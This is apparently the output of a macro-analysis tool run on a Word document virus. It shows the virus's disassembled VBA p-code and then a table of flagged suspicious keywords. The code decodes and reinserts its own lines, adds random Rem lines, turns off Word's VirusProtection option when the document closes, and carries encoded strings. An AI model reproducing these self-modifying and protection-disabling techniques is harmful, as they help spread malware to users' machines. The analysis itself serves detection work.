' 	ArgsMemLd ProcStartLine 0x0002 
' 	Add 
' 	Paren 
' 	LitDI2 0x0002 
' 	Sub 
' 	For 
' Line #101:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St my_body 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St wizard 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St body_fuck 
' Line #102:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0004 
' 	Ld my_body 
' 	FnLen 
' 	For 
' Line #103:
' 	Ld body_fuck 
' 	Ld my_body 
' 	Ld o 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld wizard 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St body_fuck 
' Line #104:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #105:
' 	Ld td 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld body_fuck 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #106:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #107:
' 	EndIfBlock 
' Line #108:
' 	EndFunc 
' Line #109:
' 	FuncDefn (Private Function KME(td))
' Line #110:
' 	LitDI2 0x0001 
' 	St k 
' 	BoS 0x0000 
' 	Ld k 
' 	LitDI2 0x0003 
' 	Le 
' 	DoWhile 
' Line #111:
' 	Ld td 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x000A 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St nomer_of 
' Line #112:
' 	LitStr 0x0004 "Rem "
' 	Ld Application 
' 	MemLd UserName 
' 	Add 
' 	Ld Application 
' 	MemLd Version 
' 	Add 
' 	Ld Now 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Add 
' 	St fuck 
' Line #113:
' 	Ld nomer_of 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	IfBlock 
' Line #114:
' 	Ld nomer_of 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0001 
' Line #115:
' 	ElseBlock 
' Line #116:
' 	Ld nomer_of 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Ne 
' 	Ld nomer_of 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld nomer_of 
' 	Ld fuck 
' 	Ld td 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' 	EndIf 
' Line #117:
' 	EndIfBlock 
' 	BoS 0x0000 
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #118:
' 	Loop 
' Line #119:
' 	EndFunc 
' Line #120:
' 	FuncDefn (Sub AutoExit())
' Line #121:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	EndWith 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Sub Èíîïëàíåòíûé_ãîñòü(td, ad))
' Line #124:
' 	QuoteRem 0x0000 0x005F " 7t€fivk€'D'Y[ypt/{k5JvklTvk|sl5spulz/83'{k5JvklTvk|sl5Jv|u{VmSpulz'4'870'2'}iJySm'2')Luk'Z|i)0"
' Line #125:
' 	QuoteRem 0x0000 0x0035 " 7Vwlu')jAc~pukv~zcz€z{ltcrv{v}5z€z)'Mvy'V|{w|{'Hz'*8"
' Line #126:
' 	QuoteRem 0x0000 0x0044 " 7Wypu{'*83')H{{ypi|{l']IfUhtl'D')'2'Joy+/:;0'2')Yhul{rh)'2'Joy+/:;0"
' Line #127:
' 	QuoteRem 0x0000 0x0013 " 6Vxotz&)72&sehuj"
' Line #128:
' 	QuoteRem 0x0000 0x000A " 6Iruyk&)7"
' Line #129:
' 	QuoteRem 0x0000 0x0017 " 8Nwz(q(E(:(\w(il6Kw}v|"
' Line #130:
' 	QuoteRem 0x0000 0x0048 " 5Nk%fi3Nyjr-n.3Sfrj%B%'Wfsjypf'%Ymjs%J}ny%Xzg%Jqxj%fi3Wjrt{j%fi3Nyjr-n."
' Line #131:
' 	QuoteRem 0x0000 0x0008 " 8Vm€|(q"
' Line #132:
' 	QuoteRem 0x0000 0x0029 " 8il6Quxwz|(*kBdqvlw{d{�{|mudsw|w~6{�{*"
' Line #133:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

